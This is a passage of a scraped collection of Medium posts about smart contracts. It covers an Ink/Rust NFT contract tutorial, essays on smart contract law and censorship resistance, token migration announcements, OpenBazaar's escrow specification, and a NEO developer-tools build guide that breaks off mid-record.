Notice there is no semi-colon after the env::deposit_raw_event function call? In Rust, omitting the semi-colon from the last expression of a function returns the result of that expression, removing the need to write return, although it is perfectly valid to do so if you\u2019d like to return further up the function.A note on Rust\u2019s ownership mechanismAnother important Rust (and therefore Ink) programming concept to understand is that of ownership. Our deposit_event function utilises ownership. Take a look at & used before the event argument in env::deposit_raw_event:env::deposit_raw_event(&event.encode()[..])                       ^                       we are referencing `event` hereIn Rust, & represents a reference to an object.Had we not used a reference, env::deposit_raw_event would take ownership of event, and thus would no longer be available to use in deposit_event(). event would \u201cmove\u201d into the containing function, and would no longer be in scope in the outer function. If we attempted to use event after this point, we would receive an error\u00a0, as event would no longer exist in that scope.Even though our deposit_event() function only has one line of code, and therefore moving event out of scope would have no impact of the rest of the function, env::deposit_raw_event actually expects a reference. Take a look at the error we receive when removing the reference:deposit_raw_event expects a reference of an encoded\u00a0eventThe editor is extremely helpful when dealing with Rust ownership, and will ensure that you iron out ownership issues before attempting to compile the program. In this case, it actually tells us how to fix this error under the help section.To read more about Rust ownership, The Rust Book has a great section explaining the concepts; it is advised to understand Rust ownership before endeavouring into Ink smart contract programming.With our events defined (and the helper function for emitting those events), let\u2019s now explore the contents of the contract! macro itself.Contract VariablesContract variables can be thought of as class properties that are accessed within functions via self. Here are the contract variables of our NFToken contract:struct NFToken {   /// owner of the contract   owner: storage::Value<AccountId>,       /// total tokens minted   total_minted: storage::Value<u64>,      /// mapping of token id -> token owner   id_to_owner: storage::HashMap<u64, AccountId>,   /// mapping of token owner -> amount of tokens they are holding   owner_to_token_count: storage::HashMap<AccountId, u64>,   /// mapping of token id -> approved account   approvals: storage::HashMap<u64, AccountId>,}The first two variables are of type storage::Value, and the following three of storage::HashMap. In fact, the ink_core storage module has to be used for any contract data we wish to persist on chain.storage types are generic, and as such we explicitly provide the type of data we are storing, in angle brackets.With the required contract data defined, let\u2019s explore some of the contract implementation, highlighting some key logic and syntax.DeploymentThe deploy function is compulsory in any Ink contract, and is called when instantiating a contract once it is deployed to a chain.Wrap the deploy() function within an impl Deploy for <contract_name> block. The actual implementation of deploy is very straight forward; here it is in its entirety:impl Deploy for NFToken {   fn deploy(&mut self, init_value: u64) {             // set initial total minted tokens to 0      self.total_minted.set(0);      // set the contract owner to the caller      self.owner.set(env::caller());             // if initial token value provided, call the minting function      if init_value > 0 {         self.mint_impl(env::caller(), init_value);      }   }}We are simply setting default values here, with the addition of some initial token minting. We will explore the minting implementation next.Minting ImplementationMinting is the process of generating new tokens. For our NFToken contract the following conditions need to be met for minting:Each token must have a unique index represented by a token_idAn AccountId to mint the tokens to needs to be providedOnly the contract owner can mint new tokensThe public function mint() is declared to handle calls to mint tokens:// mint function signaturepub(external) fn mint(   &mut self,    value: u64) -> bool {}Mint accepts two arguments; the account to mint tokens to, and an amount of tokens to be minted. The first parameter to our function signature is always a reference to self. In addition we can also include mut to declare that self can be updated, essentially providing a mutable reference to the contract instance.mint() calls the private mint_impl() function, that carries out the actual minting process. This pattern of exposing a private function via a public one is also consistent for transferring and approving.mint_impl() will carry out the following tasks:Work out the first new token_id and the last token_id to be minted. This is calculated based on the self.total_minted contract variable.We define a for loop that will increment token ids and insert each one into the self.id_to_owner hash map. The specific syntax for this loop is interesting, adopting a for in structure, and adopting a spread operator:for token_id in start_id..stop_id {   self.id_to_owner.insert(token_id, receiver);   //                      ^         ^   //                      new id    owner of the token}Ink\u2019s implementation of HashMap closely mirrors that of the standard Rust implementation. insert() will add a new record to our mapping. Check out the full reference here for all the ways we can manipulate a HashMap.A note on dereferencing, with\u00a0*To obtain the raw value of our contract variables we need to \u201cdereference\u201d them. The concept of dereferencing is explained in detail here in The Rust Book, but essentially dereferencing allows us get to an underlying value of a pointer or a reference.Let\u2019s take a look at how we calculate start_id inside mint_impl() as an example of where dereferencing has been used:total_minted actually points to storage::Value, not the underlying u64 value we intend to\u00a0getHovering over self.total_minted reveals that we need to dereference storage::Value to obtain the underlying u64 value. Like referencing, the editor is intelligent enough to realise when an expression does not make sense\u200a\u2014\u200ae.g. trying to add 1 to a storage::Value object, that would result in an error.Even though dereferencing may not be suggested as a fix, it should be obvious to the programmer once the error is pointed out in the editor.", "responses": ""}, {"title": "Smart Contracts: The Next Big Blockchain Application", "author_name": "Cornell Tech", "link": "https://medium.com/cornell-tech/smart-contracts-the-next-big-blockchain-application-635d3e697129?source=search_post", "post_date": "Apr 15, 2016", "readtime": "3 min read", "upvotes": "3", "content": "Smart Contracts: The Next Big Blockchain ApplicationCornell TechBlockedUnblockFollowFollowingApr 15, 2016By Bill Marino, CS MEng \u201816Blockchain is in the news again, recently landing a cover story in The Economist. This time, the focus of the conversation is applications of the blockchain beyond the one you already know: cryptocurrencies, like Bitcoin.One of these new applications is cryptocontracts\u200a\u2014\u200ai.e., smart contracts. While the Economist article mentions them only fleetingly, smart contracts are the blockchain use case most likely to appear in your daily life soon.Not All Smart Contracts Are ComplexA smart contract is a contract captured in software that automatically performs the obligations the parties have committed to under their agreement. It turns out the ideal place to store such a contract, both because of its immutability and its cryptographic security, is a blockchain. Many blockchain-based smart contracts currently being engineered are complex, covering everything from financial derivatives to crowd funding agreements. But there are relatable ones, too.Here\u2019s an example. Suppose you want to rent my apartment for a night. It would be easy to craft our rental agreement as a smart contract. In fact, it can have just two functions. First, to accept transmission of a rental fee (in cryptocurrency form, let\u2019s say) from you, the renter. It will send me a receipt but hold the fee in the contract. Second, to accept transmission of a digital apartment entry key from me.If I send the key before the rental date, the function holds it, along with the fee, releasing them to you and me, respectively, when the date arrives. If the function does not receive my key by the rental date, it refunds you the fee.Once we initialize the contract, we can relax, knowing that our agreement will be programmatically enforced. If I send a key, I\u2019m sure to be paid. If you send a fee, you\u2019re sure to receive a key (or a refund).How Smart Contracts Will Interact With the Law Remains UnclearYou\u2019re not alone if you look at the example above and see potential issues. What happens if I send the wrong code? Or if I send the right code, but my apartment is condemned before the rental date arrives? Were this a contract at law, it might be possible to rescind (undo) it, either by agreement or with the assistance of a court. But here, that remedy accomplishes nothing. This contract will perform no matter what.And this is just one of many interesting legal conundrums surrounding smart contracts. How will courts intervene when contracts violate securities or other laws? If they exist on the blockchain, who will have jurisdiction? Who can tax them? The list goes on.Cornell Tech Is Leading the Examination of These Issues and OthersAs a lawyer and Computer Science master\u2019s student at Cornell Tech, I was long captivated by smart contracts and eager to probe these issues. In that regard, Cornell Tech has been a serendipitous fit because it\u2019s leading the effort to study smart contracts. In fact, three of our faculty members\u200a\u2014\u200aAri Juels, Roni Michaely, and Rafael Pass\u200a\u2014\u200aare part of the Initiative For Cryptocurrencies & Contracts (IC3), several of whose faculty were the recent recipients of a $3 million NSF grant to study this field.This fall, I have been fortunate enough to do research for IC3 and Professor Juels, examining some of the very issues discussed above. I will present some of my findings in December during a smart contract tutorial at JURIX 2015, the 28th International Conference on Legal Knowledge and Information Systems.In November, I had a chance to do the same at Ethereum DevCon1, the first large developer\u2019s conference for Ethereum, a premier blockchain-based smart contract platform. In addition to my presentation, DevCon1 featured talks by Nick Szabo, often credited with first conceiving of smart contracts, and singer Imogen Heap, who is building a music distribution contract on Ethereum.As I said, it may not be long before smart contracts appear in your daily life.", "responses": "1"}, {"title": "Smart contract platforms vs Tor + Bitcoin for censorship-resistant online\u00a0services", "author_name": "Noah Ruderman", "link": "https://medium.com/@noahruderman/smart-contract-platforms-vs-tor-bitcoin-for-censorship-resistant-online-services-545bd1f7a789?source=search_post", "post_date": "Sep 21, 2018", "readtime": "5 min read", "upvotes": "18", "content": "Smart contract platforms vs Tor + Bitcoin for censorship-resistant online\u00a0servicesWhich platform is better suited to host censorship-prone services?Noah RudermanBlockedUnblockFollowFollowingSep 21, 2018tldr; A smart contract platform is the minimum viable product for an online service which requires a highly distributed data store. It is technologically superior to Tor hidden services in terms of censorship-resistance.IntroductionNobody I\u2019ve heard of thinks of smart contract platforms as extremely efficient censorship-resistant online services. Here I am going to demonstrate that they are by showing the minimum requirements of a service which provides highly distributed data storage. Smart contract platforms improve significantly on Tor hidden services and the best way to see how is to design a better system and see what comes out.Background on censorship-resistant servicesTor hidden services with Bitcoin were the first way to offer a service in a censorship-resistant manner that scaled. In this setup, the administrator ran a database and a server as part of the hidden service. They both provided data storage and a means of executing business logic. Bitcoin was obviously the means of payment.The weakness with this setup was that there was no real censorship-resistance in terms of data storage or executing business logic. Rather, the hidden nature of the service meant it could operate so long as it was not discovered. Once it was discovered, there was no way to protect the service from being taken down. So let\u2019s try to improve on this by adding censorship-resistance to these core features.Minimum requirements to offer online services, censored or\u00a0notData storageA way to implement business logicPaymentsConventionally, data stores are provided by databases and business logic is implemented by servers. With Bitcoin we\u2019ve solved the payments problem, so let\u2019s figure out how we can build a system whose data and servers can\u2019t be taken down.What if we used a censorship-resistant means of data\u00a0storage?This would be like using a decentralized data store such as Freenet and Bitmessage, or a distributed blockchain. These are censorship-resistant because the former two are decentralized and the latter is immutable. All that we require right now is that the data is highly distributed, and everyone has a copy. The problem with using a blockchain in this case is that it requires a consensus mechanism which is a lot of overhead, so let\u2019s avoid it unless we need it. The main issue with these options is that they only contain static content. This is to say that there\u2019s no way to implement the actual business logic when end-users interact with these web pages. For now, we have the censorship-resistant data storage part solved. Now we just need to figure out how to execute the business logic.How can we implement business logic on a distributed data\u00a0store?First, let\u2019s consider how updates to data are made. Unlike a centralized data store where only the owner needs to make an update to one copy and shares it with others, this decentralized data store is distributed throughout the network and it all needs to be updated in real time by the people who possess those copies of that data.For trust-minimization, we want to formally specify the kinds of ways service data can be altered with access rights. We can do this by having a separate static document describe how the service is to be used and by whom, which we can consider a contract. An abstract programming interface (API) in the contract can rigorously specify what instructions can be executed and how they are executed.End-users invoke a public facing API function directly and they authenticate with a public/private key. Other users can repeat these instructions to verify that the change was legal. Since executing these changes manually is error-prone and doesn\u2019t scale, a virtual machine can execute these instructions on behalf of the end-user.But this leaves open one more problem\u200a\u2014\u200ahow do we know the right order to execute instructions? What if two conflicting instructions are issued at the same time? We can use a relative time stamping service like a blockchain. With a token and consensus mechanism, control of the blockchains can be decentralized, which is necessary given the critical role it plays in this system.How to offer censorship-resistant online\u00a0servicesBlockchain for immutable data storage and transaction serialization.A smart contract to specify the operations that can be performed on the service data and by whom, and a virtual machine to execute business logic in transactions.Native token for payments and transaction fees.This is just a smart contract platform. We tried to design a service which would offer censorship-resistance at the data storage layer and somehow we ended up with something familiar that we never thought of as having incredible security properties.Smart contract platforms are highly efficient censorship-resistant servicesIt turns out that if you have a highly distributed data store for an online service:A contract is necessary for specifying what changes can be made, who is authorized to make those changes, and how to make those changes.A virtual machine is necessary to execute those instructions.A relative time stamping service (blockchain) is necessary to order transactions for the virtual machine.A consensus mechanism is necessary to decentralize control of the blockchain and keep the copies in sync.A token is necessary to reward block producers for securing the system.ConclusionHow technologies compare as censorship-resistant online\u00a0servicesSmart contract platforms are the logical result of using a highly distributed data store to implement an online service. It\u2019s efficient because it includes only the minimum requirements without the burden of unnecessary features. The only reasonable technology improvement would be mandatory, on-chain privacy.Smart contract platforms are superior to Tor hidden services regarding censorship-resistance. The weakest point of hidden services is that if the servers are discovered they can be taken down. Smart contract platforms, in contrast, can\u2019t be taken down.", "responses": "1"}, {"title": "Announcing SUAPP Token Smart Contract Migration", "author_name": "SUAPP", "link": "https://medium.com/@suapp/announcing-change-in-suapp-token-smart-contract-849d79396c5c?source=search_post", "post_date": "Nov 3, 2018", "readtime": "", "upvotes": "51", "content": "Announcing SUAPP Token Smart Contract MigrationSUAPPBlockedUnblockFollowFollowingNov 3, 2018Greetings from SUAPP TeamWe are pleased to announce change in SUAPP Smart Contract Address to fix bug discovered from recent smart contract security Audit, reduce in token Total Supply and change SUAPP Token Ticker to avoid confusion on Coinmarketcap. We decide to make this change before smart contract is deploy.Below are major changes made in SUAPP Smart Contract.\u00b7 Change from Old Smart Contract Address: 0xebe499ae537484f182b48ec9d8f72ae5a293f366ToNew Smart Contract Address: 0x425d354dceb40a5f64992d487dc51f7b83ea0ac7\u00b7 Token Total Supply reduces from 100Billion to 1Billion.\u00b7 Change in Token ticker from SUP to SUT.This change will affect Airdrop, BOUNTY and ICO Distribution. Distribution on new Smart Contract Address will be in this ratio 100\u00a0: 1 i.e. Everyone that\u2019s entitled to receive 100million token from old smart contract will receive 1million in new token distribution. This decision is made to improve smart contract security and enhance token liquidity.New SUAPP Token informationNew Total Supply: 1Billion SUT / SUAPP TOKENAvailable for sales: 500million SUT / SUAPP TOKENNew SUAPP TOKEN Contract Address: 0x425d354dceb40a5f64992d487dc51f7b83ea0ac7New SUAPP TOKEN Ticker: SUTSUAPP TOKEN Decimal: 8For more information, please visit:Website: https://suapp.orgTelegram: https://t.me/suapptokenEmail: info@suapp.orgFacebook Link: https://facebook.com/suappofficialTwitter Account Link: https://twitter.com/suapp1We appreciate your support on this project.SincerelySUAPP Team", "responses": ""}, {"title": "Escrow Smart Contract Specification in OpenBazaar", "author_name": "OpenBazaar", "link": "https://medium.com/openbazaarproject/escrow-smart-contract-specification-in-openbazaar-94c0937822c3?source=search_post", "post_date": "Oct 24, 2018", "readtime": "6 min read", "upvotes": "52", "content": "Escrow Smart Contract Specification in OpenBazaarOpenBazaarBlockedUnblockFollowFollowingOct 24, 2018By Austin Williams, OpenBazaar ResearcherThe integration of Ethereum into OpenBazaar represents one of the most challenging and rewarding tasks we\u2019ve done for the project so far. We are so excited to bring our vision of seeing cryptocurrency and tokens used for real-world commerce to the Ethereum community!IntroductionOpenBazaar facilitates trades between arbitrary third parties on the internet. Currently, only UTXO-based cryptocurrencies can be used as a medium of exchange on OpenBazaar. The escrow contract is intended to be used as a way to shoehorn Ethereum functionality into OpenBazaar\u2019s existing framework so that users can trade using ETH and ERC20 tokens as their medium of exchange.How OpenBazaar Trades Currently Work (in UTXO\u00a0land)Moderated PaymentsWhen a buyer and seller have agreed on a product and a price, the buyer sends their funds to an escrow address, which is a 2-of-3 multisig address with one key controlled by the buyer, one key controlled by the seller, and one key controlled by a moderator that has been agreed upon by both the buyer and the seller.On the \u201chappy path\u201d, the seller delivers the goods, then the buyer releases the funds to the seller (with the buyer and seller signing the payout transaction from the escrow address).In the event that the seller does not deliver the goods as promised, the buyer pleads their case to the moderator, and the buyer & moderator can send the funds from escrow back to the buyer.In the (very common) case where the buyer receives their goods but doesn\u2019t release the funds to the seller, the seller presents their case to the moderator, and the seller & moderator sign the funds from escrow to the seller.The seller can also unilaterally release funds from escrow after a previously agreed upon amount of time has passed. This allows the seller to release the funds from escrow without the moderator in the event that the buyer disappears. With UTXO-based coins, this is achieved by requiring that the buyer sign an nLockTime transaction releasing funds to the seller, and then passing that transaction to the seller (off-chain) before the seller delivers the product or service.Direct PaymentsBuyers have the option of not using a moderator when making an OpenBazaar trade. While this isn\u2019t recommended, it may be an acceptable risk for the buyer if the buyer trusts the seller. Direct or unmoderated payments come in two forms: online payments and offline payments.Online direct payments occur when the buyer knows the seller is online. For online payments, the buyer simply sends the funds directly to the seller\u2019s wallet after requesting an address to pay to. These are simple, classic transfers of value from one account to another.Offline payments occur when the buyer sees that the seller is offline and is uncertain whether the seller will ever come back online. In this case the buyer sends the funds to a 1-of-2 multisig address with one key held by the buyer and the other held by the seller. If the seller comes back online, they can accept the funds. If the seller doesn\u2019t come back online, the buyer can reclaim the funds.Limitations Imposed by OpenBazaar\u2019s Wallet InterfaceOpenBazaar interacts with all supported coins through its wallet interface. This means that OpenBazaar\u2019s Ethereum smart contracts must be designed in such a way as to be compatible with that interface. OpenBazaar is a live/launched product, so making big changes to the wallet interface in order to support Ethereum is non-trivial. Instead, we\u2019ve decided to keep the wallet interface fixed (for now), and design the smart contract to be compatible with it.Intended Use of the Escrow\u00a0contractThe Escrow contract will store the escrowed funds and state information for every OpenBazaar trade that is using Ethereum (or ERC20 tokens) as the medium of exchange.We could have, instead, opted to deploy a new escrow contract for each Ethereum-based trade\u200a\u2014\u200athereby siloing escrowed funds from each trade in their own smart contract. However, we think the gas requirements for doing so are cost prohibitive, and we fear that would introduce too much friction into Ethereum-based trades.OpenBazaar trades that use ETH/ERC20 as the medium of exchange are intended to follow the same protocol as those that use a UTXO-based coin as the medium of exchange\u200a\u2014\u200aand the escrow smart contract is intended to facilitate that.Funding the\u00a0TradeBuyers initiate a trade by creating/storing a Transaction struct in the Escrow contract and (simultaneously) funding the transaction by sending ETH (or ERC20 tokens) to the Escrow contract. At this point the transaction is in the FUNDED state. While in the FUNDED state, the buyer may add more ETH (or ERC20 tokens) to escrow if necessary.Releasing Funds from\u00a0EscrowWhile the transaction is in the FUNDED state, the escrowed funds can be released only if:Two of the three participants (buyer, seller, and moderator) agree on how the escrowed funds are to be distributed.An amount of time (timeoutHourse) has passed since the last time the buyer added funds to escrow.The reasoning behind (2) is that it is very common for buyers to not release funds after they\u2019ve received their goods (this is due more to buyer laziness than malice). In that event, we want to make it easy for the seller to claim the escrowed funds without having to coordinate with a moderator.Funds released from escrow can be split up and sent to various addresses. However, the receiving addresses must be the addresses of the trade\u2019s buyer, seller, or moderator. To reiterate, funds cannot be sent to an address that is not affiliated with the trade in question, but the escrowed funds can be divided up among the participants in any way\u200a\u2014\u200aso long as 2-of-3 of the parties agree.Upon release of funds from escrow, the trade is put into the RELEASED state. Once in the RELEASED state, trades can no longer be altered. All participants who received some of the escrowed funds are noted in the trade\u2019s Transaction struct (via the beneficiaries mapping).(The beneficiaries information will be used later, by other contracts, to determine whether or not a given trade was disputed, refunded, etc.).Offline Direct\u00a0PaymentsThe escrow contract can mirror the behavior of UTXO-based offline payments by calling addTransaction (or addTokenTransaction if it is an ERC20 transaction), setting the threshold value to 1, and setting the moderator address to a known, non-zero burn address. The effect is the equivalent of a 1-of-2 multisig address where the buyer holds one key and the seller holds the other.Known Issues /\u00a0MiscModerator selectionIt is assumed that the moderator is trusted by both the buyer and the seller before the trade begins. The obvious threat of collusion between a buyer and moderator\u200a\u2014\u200aor seller and moderator\u200a\u2014\u200ais beyond the scope of this contract.Push vs\u00a0pullThe transferFunds function uses push payments (rather than the pull model) due to limitations imposed by OpenBazaar\u2019s wallet interface. Hence any of the beneficiaries of a payout from escrow can cause the payout to fail (for example, by putting a revert() in their fallback function).Game theoretically speaking, such a DoS attack is irrational for any of the participants capable of causing such an issue, because the honest parties can always benefit by removing the offending party as a beneficiary and taking her share of the payout.For example, suppose the three parties agreed that the moderator would received 5% of the funds, and that the buyer and seller would split the remaining funds. The seller, being unhappy with the result, could cause the payout to fail until she could negotiate a more favorable agreement. However, the buyer & moderator\u200a\u2014\u200aupon seeing the seller\u2019s misbehavior\u200a\u2014\u200acould simply agree to remove the seller as a beneficiary\u200a\u2014\u200athus removing the seller\u2019s ability to DoS the payout.)For this reason, we consider the DoS possibility caused by use of push payments in the transferFunds function to be low risk.SecurityQuality assuranceThe code for the escrow smart contract can be found in Github here. We invite the community to examine the code and post issues or suggestions. Furthermore, we have written 37 tests for the contract to achieve >90% code coverage.AuditWe\u2019ll be working with OpenZeppelin to have the contracts audited and hope to have the audit process completed before the end of the year.Special thanksWe\u2019d like to extend a special thanks to the following folks who helped us get here:Andrey \ud83e\udd83 PetrovAshwin MangaleSameep SinghaniaAustin WilliamsChris PaciaOpenZeppelin", "responses": ""}, {"title": "CareonChain will have a smartcontract Swap", "author_name": "Careon Chain (REO COIN)", "link": "https://medium.com/@careonchainio/careonchain-will-have-a-smartcontract-swap-bd3587f13f73?source=search_post", "post_date": "Dec 7, 2018", "readtime": "", "upvotes": "12", "content": "CareonChain will have a smartcontract SwapCareon Chain (REO COIN)BlockedUnblockFollowFollowingDec 7, 2018Careonchain will under go a smart contract swap due to scam by sidera.ioCareonchain and sidera.io had a Strategic Investment Partnership of 1 Million USD. But due to breaking of terms and conditions of investment contract they turned into scam and further they denied to return back REO tokens. The CEO and Team Members have disappeared. The website not working.sidera.io had listed the contract on forkdelta and ether delta. They had traded the contract at very low price. And those purchased from that exchange will not be receiving new swap coins.Therefore Careonchain will swap the smart contract. All the token Holders will receive new REO tokens Automatically. Nobody needs to claim the new tokens. There is no Claim forum.www.careonchain.io", "responses": ""}, {"title": "", "author_name": "Ouriel Ohayon", "link": "https://medium.com/@ourielohayon/well-i-would-not-put-smart-contract-and-consensus-rules-out-of-the-blockchain-scope-f3f72bb29fd6?source=search_post", "post_date": "Sep 9, 2017", "readtime": "", "upvotes": "4", "content": "Ouriel OhayonBlockedUnblockFollowFollowingSep 9, 2017well i would not put Smart Contract and consensus rules out of the blockchain scope. For me this is an integral part of it. I met Vitalik Buterin this week and he was clear about it, what makes blockchain what it is in the reconciliation of crytpology and sophisticated economic frameworks which include decentralization *and* procedures (cyrpto-economics). If that was just a database without the \u201cintelligence\u201d to deal with it there would be no point and no interest. I don\u2019t think it is possible to understand, even at the minimum. what a blockchain is by restricting it to the definition of a distributed database/record of transactionI would also claim that actually many people don t know what a database is. I mean yes if you are in the tech community but that s it. if you try to talk to another person that will be a challenge. The image of a trusted computer is a lot easier to digest.", "responses": "1"}, {"title": "", "author_name": "Bernhard Mueller", "link": "https://medium.com/@muellerberndt/smart-contract-bugs-happen-but-insecurity-is-not-a-truth-inherent-to-the-concept-of-smart-62a53c9ae325?source=search_post", "post_date": "Jun 17, 2018", "readtime": "", "upvotes": "13", "content": "Bernhard MuellerBlockedUnblockFollowFollowingJun 17, 2018Smart contract bugs happen, but insecurity is not a fundamental property of smart contracts. It is a known problem that is being addressed on multiple fronts: Best practices, human audits, verifiable languages, verified components, security tooling, and lots of interesting research.One could write a similar article about Bitcoin pointing out that \u201cthe truth about Bitcoin\u201d is that it\u2019s not useful as a store of value because insecure wallets exist. Why not spread user awareness and create safer wallets instead.Instead of pointing out \u201cintractable\u201d flaws in whatever doesn\u2019t happen to be one\u2019s favorite blockchain, the time would be better spent on addressing those problems and helping real-world adoption.", "responses": ""}, {"title": "", "author_name": "Joel Dietz", "link": "https://medium.com/@Swarm/we-put-the-remainder-into-a-smart-contract-liquid-democracy-platform-that-can-be-used-for-fund-1d7cdf26e937?source=search_post", "post_date": "May 28, 2017", "readtime": "", "upvotes": "1", "content": "Joel DietzBlockedUnblockFollowFollowingMay 28, 2017We put the remainder into a smart contract liquid democracy platform that can be used for fund management platform and the tokens are being swapped transferred from the Bitcoin blockhain to the Ethereum one.Get Swarm Fund White Paper (Instant Download)*********************************************Subscribe To Get The Latest Swarm Fund News*********************************************Join Our Cryptocurrency Communities: Swarm Fund Telegram Or Slack*********************************************", "responses": "3"}, {"title": "Neo Smart Contract Development -Part\u00a05", "author_name": "Gaurav Agrawal", "link": "https://medium.com/coinmonks/neo-smart-contract-development-part-5-33ff3d7ba358?source=search_post", "post_date": "May 14, 2018", "readtime": "8 min read", "upvotes": "51", "content": "Neo Smart Contract Development -Part\u00a05Build and test NEO developer tool projects (from\u00a0source)Gaurav AgrawalBlockedUnblockFollowFollowingMay 14, 2018Attribution\u200a\u2014\u200aThis series is republish work of Michael Herman (Toronto) from his Git Repository. All claps and Praise goes to him.PurposeThe purpose of this activity is to build the NEO developer tools from the sources downloaded and unpacked in the previous activity.Goals, Non-Goals and AssumptionsEnsure you have a working and properly configured set of NEO developer tools for creating and building smart contracts in Visual Studio with the C# programming languagePrinciplesProvide reliable documentation: timely, accurate, visual, and completeSave as much of a person\u2019s time as possibleUse open source software whenever possibleDriversNeed in the NEO\u00a0.NET developer community to have concise and easy-to-follow documentation to enable people to get up to speed developing NEO smart contracts in as short a time as possibleBuild and test NEO developer tool projects (from\u00a0source)Build the Neon NEO MSIL TranscompilerOpen the neo-compiler project in Visual Studio by double-clicking neo-compiler.sln in the C:\\NEO\\neo-compiler-master\\neo-compiler-master folder created in Activity 2 - Download and unpack NEO developer tool projects (source).Figure 5.1. Open neo-compiler.sln in Visual Studio\u00a020172. Uncheck the message Ask me for every project in this solution and click OK.Figure 5.2. Visual Studio: Uncheck the message Ask me for every project in this solution and click\u00a0OK3. Visual Studio will open with the project displayed in the Solution Explorer to the right.Figure 5.3. Visual Studio: Solution\u00a0Explorer4. Right-click the solution name neo-compiler near the top of the Solution Explorer and select Rebuild Solution. Several things will happen the first time you do this; for example, the referenced Nuget packages will be downloaded and refreshed in addition to the sources being compiled to create the NEO compiler set.Figure 5.4. Visual Studio: Rebuild\u00a0Solution5. Rebuild Solution completes.Figure 5.5. Rebuild Solution completes6. Right-click the project name neon in the Solution Explorer and select Publish.NOTE: This is the single most troublesome set of tasks in the entire Quick Start process. Follow these manual workarounds carefully.Figure 5.6. neon Project: Publish...7. The following Publish page will appear in Visual Studio. Select Publish on the left side (and not Connection Services). Click the Publish button to continue (using the default settings).Figure 5.7. neon Project: Publish to\u00a0Folder8. When you see \u201cPublish failed\u201d, this is the problem area. Click OK to close this dialog box.Figure 5.8. neon Project: Published failed9. In the Output pane at the bottom of the screen, change the drop down \u201cShow output from:\u201d from Build to Build Order. Note the highlighted error message about the missing neon.dll. It's not missing - it is in a different directory and needs to be manually copied to where Visual Studio expects to find this DLL.Figure 5.9. neon Project: neon.dll is missing (but not\u00a0really)10. Open Windows Explorer and navigate to the folder C:\\NEO\\neo-compiler-master\\neo-compiler-master\\neon\\bin\\Release\\netcoreapp1.0. We need to copy neon.dll from this folder to the folder where Visual Studio expects to find it.Figure 5.10. neon Project folder: C:\\NEO\\neo-compiler-master\\neo-compiler-master\\neon\\bin\\Release\\netcoreapp1.011. Right-click on neon.dll and select Copy.Figure 5.11. neon Project folder: Copy neon.dll to the clipboard12. In Windows Explorer, navigate to C:\\NEO\\neo-compiler-master\\neo-compiler-master\\neon\\obj\\Release\\netcoreapp1.0. Right-click in the file list and select Paste to paste a copy of neon.dllinto this folder.NOTE: This is the obj/Release/netcoreapp1.0 folder path.Figure 5.12. neon Project folder: C:\\NEO\\neo-compiler-master\\neo-compiler-master\\neon\\obj\\Release\\netcoreapp1.013. Back in Visual Studio, click the Publish button to publish the neon project files a second time (using the default settings).Figure 5.13. neon Project: Republish the\u00a0Project14. This time, Publish completes successfully.Figure 5.14. neon Project: Publish Succeeded15. The neon project files have been published to C:\\NEO\\neo-compiler-master\\neo-compiler-master\\neon\\bin\\Release\\PublishOutput.NOTE: Remember this path because in the next set of tasks, we need to attend to the Windows Path search path environment variable.Figure 5.15. neon Project: PublishOutout FolderAt this point, the neo-compiler project has been built and published. The remaining tasks are to:Configure Windows Path search environment variable, andTest that the neon transcompiler works properly with a Visual Studio NEO smart contract project.16. To configure the Path environment variable, from the Windows start menu, enter \"system\" and select the System control panel app. In the left pane, click Advanced system settings to display the System Properties dialog box.Figure 5.16. Control Panel: System Properties17. On the System Properties dialog box, click Environment Variables... to display the Environment Variablesdialog box. Note the Path environment variable in the System variables section. Select Path and clck Edit....Figure 5.17. Control Panel: System Properties: Environment Variables17. Click New to add the PublishOutput path to the current list of folders in the Path environment variable. Use C:\\NEO\\neo-compiler-master\\neo-compiler-master\\neon\\bin\\Release\\PublishOutput for the value of the new path. Click OK twice to close the 2 Environment Variables dialog boxed and return the the System control panel app.Figure 5.18. Control Panel: System Properties: Path Environment VariableTest the Neon NEO MSIL Transcompiler19. We\u2019ll go step-by-step. Firt, open a new Windows Command Prompt. Enter Path and press Enter to inspect the current value of the Path environment variable. You should be able to find the PublishOutput path in the list (closer to the end of the list but it isn't necessarily the very last element of the list).Figure 5.19. Command Prompt: Path Environment Variable20. Open Visual Studio 2017 to create a new NEO smart contract project.Figure 5.20. Visual Studio\u00a0201721. Select File > New > Project... to open the New Project dialog box. Select Visual C#. Select NeoContract. Click OK to close this dialog box and create a new NeoContract solution and project in Visual Studio.Figure 5.21. Visual Studio: Create a New NeoContract Project21. Visual Studio may take a few minutes to create the NeoContract project.Figure 5.22. Visual Studio: Creating the NeoContract Project23. Right-click on the NeoContract project folder and select Build. Note the highlighted messages in the Build section of the Output panel. These 2 message indicate the Visual Studio was able to create both the NEO virtual machine byte code file as well as the Application Binary Interace (ABI) file (in JSON format).NOTE: If you don\u2019t see these 2 messages, the most likely senarios are:neon.dll wasn't published properly. Go back to Task 6 of this activity.The Path environment variable was not set correctly. Go back to Task 16 of this activity.You had opened Visual Studio before you set the Path environment variable. Close Visual Studio and then go back to Task 20.Figure 5.23. Visual Studio: Building the NeoContract ProjectBuild the Neo-Gui-Developer Node/Wallet25. Open the neo-compiler project in Visual Studio by double-clicking neo-gui.sln in the C:\\NEO\\neo-gui-developer-master\\neo-gui-developer-master folder created in Activity 2 - Download and unpack NEO developer tool projects (source).Figure 5.24. Open neo-gui.sln in Visual Studio\u00a0201726. Uncheck the message Ask me for every project in this solution and click OK.Figure 5.25. Uncheck the message Ask me for every project in this solution and click\u00a0OK27. Visual Studio will open with the project displayed in the Solution Explorer to the right.Figure 5.26. Visual Studio: Solution\u00a0Explorer28. (OPTIONAL) If you are comfortable making code changes to a Windows C#\u00a0.NET Webforms application, navigate to the Mainform.cs source file in the UI folder. Right-click this file and select View Code. Scroll down to the MainForm() constructor method. At end of the constructor, add the highlighted single line of code:this.Text - \"neo-gui-dev - \" + Settings.Default.DataDirectoryPath;Type ctrl+s to save your changes to this source file. This single line of code with display the blockchain database folder name in the app's title bar next to app's name. This is a useful practice when you're using multiple sets of JSON configuration files (more about these later).Figure 5.27. Optional source\u00a0changesTest the Neo-Gui-Developer Node/Wallet28. Still in Visual Studio with the neo-gui.sln solution open (developer version), click Start to run neo-gui with the Visual Studio debugger.Figure 5.28. neo-gui: Start with Visual Studio\u00a0Debugger29. If this is the very first time you have worked with a NEO project, you may be prompted to install a root certificate into the Windows certificate store. Click Yes.Figure 5.29. Accept NEO Root Certificate30. The neo-gui (developer version) app should open and begin syncing with the NEO testnet network. You should see the block counts in the bottom-right corner increase over time as well as the the green progress bar begin to animate. Click Wallet > Exit to close the Neo-Gui-Developer Node/Wallet app.Figure 5.30. neo-gui (Developer 